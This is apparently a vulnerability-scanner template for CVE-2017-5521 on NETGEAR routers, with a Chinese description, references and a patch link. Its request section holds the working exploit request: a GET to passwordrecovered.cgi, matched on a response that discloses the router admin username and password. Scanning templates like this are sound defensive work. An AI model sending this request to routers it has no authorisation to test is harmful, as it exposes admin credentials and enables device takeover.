id: CVE-2017-5521
info:
  name: Bypassing Authentication on NETGEAR Routers
  author:
  - l0ne1y
  tags:
  - cve
  - cve2017
  - auth-bypass
  - netgear
  description: |-
    NETGEAR路由器存在管理员密码信息泄露漏洞
    NETGEAR R8500等都是美国网件（NETGEAR）公司的路由器产品。

    多款NETGEAR产品中存在安全漏洞。攻击者可通过向Web管理服务器发送特制的请求利用该漏洞造成密码泄露。以下产品受到影响：NETGEAR R8500；R8300；R7000；R6400；R7300；R7100LG；R6300v2；WNDR3400v3；WNR3500Lv2；R6250；R6700；R6900；R8000。
  reference:
  - https://www.cvedetails.com/cve/cve-2017-5521/
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2017-5521-bypassing-authentication-on-netgear-routers/
  - http://kb.netgear.com/30632/web-gui-password-recovery-and-exposure-security-vulnerability
  - http://www.securityfocus.com/bid/95457
  severity: high
  classification:
    cve-id:
    - cve-2017-5521
    cwe-id:
    - cwe-200
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
  remediation: |-
    官方修复方案：
    1.目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：
    http://kb.netgear.com/30632/Web-GUI-Password-Recovery-and-Exposure-Security-Vulnerability
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - right">Router\s*Admin\s*Username<
    - right">Router\s*Admin\s*Password<
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/passwordrecovered.cgi?id={{randstr}}'
  method: GET
